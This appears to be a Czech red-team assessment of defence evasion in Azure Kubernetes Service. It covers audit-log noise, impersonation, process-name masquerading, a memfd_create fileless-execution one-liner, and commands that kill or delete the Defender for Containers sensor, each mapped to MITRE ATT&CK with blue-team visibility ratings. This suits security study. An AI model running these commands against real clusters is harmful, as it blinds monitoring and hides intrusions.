# Manipulace auditních logů Kubernetes

## Přehled

Auditní logy Kubernetes jsou generovány API serverem a představují hlavní forenzní zdroj informací o aktivitách v clusteru. Zaznamenávají, kdo provedl jakou operaci, kdy byla provedena a s jakým výsledkem.

Z pohledu útočníka je logickým cílem omezení kvality těchto záznamů nebo snaha o ztížení jejich analýzy.

---

## Architektonická realita AKS

V prostředí AKS je řídicí rovina plně spravována společností Microsoft:

- API server běží mimo zákaznické uzly.
- Auditní logy jsou ukládány do Microsoftem spravované infrastruktury.
- Data jsou následně přeposílána do Azure Monitor a Log Analytics.
- Přímý přístup k API serveru, jeho souborovému systému ani auditním logům není z clusteru dostupný.

Tato architektura eliminuje většinu klasických technik manipulace auditních logů.

---

## Potenciální útočné postupy

### Generování šumu v auditních záznamech

Velké množství legitimních API požadavků může ztížit analýzu důležitých událostí v SIEM nástrojích.

```bash
for i in $(seq 1 10000); do
  kubectl get pods --namespace default 2>/dev/null
done
```

Očekávaný dopad:

- Nedochází ke smazání logů.
- Dochází ke zvýšení objemu auditních dat.
- Může vzniknout únava analytiků nebo problémy s konfigurací retenčních limitů.

### Zneužití impersonace

Pokud má účet oprávnění `impersonate`, lze provádět operace pod jinou identitou.

```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
```

Očekávaný dopad:

- Aktivita je zaznamenána pod impersonovanou identitou, ne pod reálným útočníkem.
- Nejedná se o obcházení logování, ale o jeho zkreslení.

### Obejít API server

Teoretickým cílem by byl přímý přístup do etcd, který by neprodukoval auditní záznamy API serveru.

Očekávaný dopad:

- V AKS není etcd z podů dostupné.
- Přístup na port 2379 je blokován architekturou služby.

---

## Očekávané výsledky

| Technika | Očekávaný výsledek |
|-----------|-------------------|
| Generování šumu | Bez přímé detekce, možné snížení kvality analýzy |
| Impersonace | Potenciálně detekovatelná v Azure Monitor a Defenderu |
| Přístup k etcd | Nedostupné z podů AKS, blokování na úrovni sítě |

### Viditelnost pro Blue Team

**Nízká až střední**

Nejrealističtějším scénářem není mazání logů, ale vytváření šumu a komplikace vyšetřování.

---

# Obcházení Microsoft Defender for Containers

## Přehled

Microsoft Defender for Containers nasazuje na každý uzel DaemonSet využívající eBPF senzor. Ten monitoruje procesy, síťovou komunikaci a práci se soubory na úrovni kernelu.

Díky tomuto přístupu je většina běžných technik skrývání aktivit uvnitř kontejneru výrazně méně účinná.

---

## Architektonická realita

eBPF monitoruje události na úrovni jádra, ne v samotném kontejneru.

Důsledky:

- většina technik pro obcházení na úrovni kontejneru nefunguje

---

## Potenciální útočné postupy

### Maskování názvu procesu

Přejmenování binárky na důvěřované jméno před jejím spuštěním. eBPF senzor zaznamenává jméno procesu z cesty souborového systému - pokud by spustitelný soubor byl pojmenován `kubelet` nebo `node-exporter`, možná by nenaplňoval kritéria hrozby:

```bash
cp /bin/bash /tmp/kubelet
/tmp/kubelet -c 'id; cat /etc/passwd'
```

Očekávaný výsledek:

- Částečně účinné proti jednoduchým pravidlovým detekcím (Falco s defaultními pravidly).
- Omezená účinnost proti behaviorálním detekcím Defenderu, klasifikujícím proces na základě jeho činnosti, ne jména.

---

### In-memory spuštění kódu (bezsouborový malware)

Spuštění procesu bez kontaktu se souborovým systémem použitím `memfd_create`.

```python
python3 -c "
import ctypes, os, sys
fd = ctypes.CDLL(None).memfd_create('', 0)
os.write(fd, open('/bin/sh','rb').read())
os.execve(f'/proc/self/fd/{fd}', ['sh'], os.environ)
"
```

Očekávaný výsledek:

- Omezení účinnosti detekce založené na souborech.
- eBPF stále zaznamená spuštění procesu, kvůli exec systemcallu.

---

### Vyřazení senzoru Defenderu

Pokud útočník získá přístup na privilegovaný pod, může se pokusit odstranit nebo zastavit Defender senzor.

```bash
# Z privilegovaného podu - list DaemonSet podů:
kubectl get pods -n kube-system | grep defender

# Kill agent podu (restartuje se, ale je tak neaktivní okno)
kubectl delete pod -n kube-system <defender-pod-name>
```

Případně:

```bash
# Zabití senzor procesu přímo z host přístupu
nsenter -t 1 -m -u -i -n -p -- kill -9 <sensor-PID>
```

Očekávaný výsledek:

- Vznik krátkého časového okna bez monitoringu.
- DaemonSet pod automaticky obnoví.
- Defender generuje upozornění na výpadek senzoru až po vzniku slepého místa.

---

### Manipulace s eBPF mapami

Výzkum ukázal, že proces s dostatečnými oprávněními může upravovat mapy eBPF používané bezpečnostními nástroji a efektivně filtrovat vlastní události dříve, než se dostanou do uživatelského prostoru. To vyžaduje zkompilovaný vlastní binární soubor. Publikovaný výzkum (`bad-bpf`) to technicky demonstruje. V praxi to vyžaduje v podu schopnost `CAP_BPF` nebo `CAP_SYS_ADMIN`.

Očekávaný výsledek:

- Manipulace s eBPF je teoreticky platná, prakticky velmi obtížná bez specifických schopností. Vyžaduje předkompilované nástroje a zvýšená oprávnění.

---

### Viditelnost pro Blue Team

**Nízká až střední**

Nejrealističtějším scénářem je získání privilegovaného podu a dočasné vyřazení monitorovacího DaemonSetu.

---

# Souhrn

| ID | Technika | MITRE ATT&CK | Viditelnost Blue Teamu |
|----|-----------|--------------|------------------------|
| B-1 | Manipulace auditních logů | T1562.008 | Nízká–střední |
| B-2 | Obcházení Defender for Containers | T1562.001 | Nízká–střední |

---

# Klíčové architektonické zjištění

Nejdůležitějším poznatkem není samotná funkčnost jednotlivých technik, ale hranice důvěry v architektuře AKS.

- API server, auditní logy a etcd nejsou z clusteru přímo dostupné.
- Defender for Containers využívá eBPF a výrazně omezuje účinnost tradičních technik skrývání aktivit.
- Nejzajímavější útočný prostor představuje kombinace privilegovaného podu a manipulace s DaemonSety.
- Významným rizikem zůstává zneužití identity uzlu nebo nesprávně nakonfigurovaných cloudových oprávnění.

# Zdroje

| Zdroj | URL |
|---|---|
| Microsoft Defender for Containers — alert reference | https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-containers |
| Microsoft Defender for Containers — architecture | https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-containers-architecture |
| Azure IMDS documentation | https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service |
| Kubernetes Audit Logging | https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/ |
| AKS monitoring with Azure Monitor | https://learn.microsoft.com/en-us/azure/aks/monitor-aks |
| AKS Network Policy | https://learn.microsoft.com/en-us/azure/aks/use-network-policies |
| MITRE ATT&CK for Containers | https://attack.mitre.org/matrices/enterprise/cloud/containers/ |
| Falco default rules | https://github.com/falcosecurity/rules/blob/main/rules/falco_rules.yaml |
| Bad BPF — eBPF evasion research | https://github.com/pathtofile/bad-bpf |
| memfd_create (fileless execution) | https://man7.org/linux/man-pages/man2/memfd_create.2.html |
| AKS Workload Identity | https://learn.microsoft.com/en-us/azure/aks/workload-identity-overview |
| Kubernetes RBAC impersonation | https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation |
